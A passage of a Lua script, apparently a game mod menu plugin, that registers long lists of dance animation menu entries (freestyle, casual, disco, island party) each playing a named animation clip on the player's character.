    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@shuffle@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Into It v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_karate@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Into It v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_karate@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Into It v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_karate@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Loose v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_monkey@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Loose v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_monkey@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Loose v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@techno_monkey@", "high_center_down", -1)
end)

----- CASUAL -----

menu.action(dancescasual_vroot, "Casual 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_a_f01", -1)
end)
menu.action(dancescasual_vroot, "Casual 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_a_f02", -1)
end)
menu.action(dancescasual_vroot, "Casual 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_b_f01", -1)
end)
menu.action(dancescasual_vroot, "Casual 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_b_f02", -1)
end)
menu.action(dancescasual_vroot, "Casual 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_c_f01", -1)
end)
menu.action(dancescasual_vroot, "Casual 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_c_f02", -1)
end)
menu.action(dancescasual_vroot, "Casual 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_d_f01", -1)
end)
menu.action(dancescasual_vroot, "Casual 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_idle_d_f02", -1)
end)
menu.action(dancescasual_vroot, "Casual 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_loop_f01", -1)
end)
menu.action(dancescasual_vroot, "Casual 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@beachdance@", "hi_loop_f02", -1)
end)


----- DISCO -----

menu.action(dancesdisco_vroot, "Disco 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_a_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_a_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_a_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_b_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_b_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_b_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_c_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_c_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_c_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_d_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_d_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_idle_d_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_loop_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_loop_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "hi_loop_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_a_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_a_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_a_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_b_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_b_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_b_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_c_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_c_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_c_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_d_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_d_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_idle_d_f03", -1)
end)
menu.action(dancesdisco_vroot, "Disco 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_loop_f01", -1)
end)
menu.action(dancesdisco_vroot, "Disco 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_loop_f02", -1)
end)
menu.action(dancesdisco_vroot, "Disco 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@club@", "mi_loop_f03", -1)
end)

----- ISLAND PARTY -----

menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_d_11_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 55", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 56", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 57", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 58", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 59", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 60", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_13_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 61", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 62", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 63", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 64", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 65", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartyhigh, "Island Party High Intensity 66", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_hu_15_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 30", {""}, "", function(on_click)
